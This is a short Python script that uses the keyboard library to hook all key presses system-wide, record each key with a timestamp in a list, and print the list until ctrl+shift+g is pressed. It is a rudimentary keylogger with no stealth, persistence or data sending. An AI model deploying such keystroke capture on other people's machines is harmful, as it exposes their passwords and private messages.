from tkinter.messagebox import showerror
import keyboard
from datetime import datetime

dickey = []
translat_key = {'space': ' ', 'enter': '\n', 'tab': '\t', 'caps lock': ''}

def on_key(e):
    key_value = " "
    human_time = datetime.fromtimestamp(e.time).strftime('%Y-%m-%d %H:%M')
    if e.name == 'backspace':
        if dickey:
            dickey.pop()
            return
    key_value = translat_key.get(e.name, e.name)
    dickey.append({human_time: key_value})
    print(dickey)
    return dickey

keyboard.on_press(on_key)
keyboard.wait("ctrl+shift+g")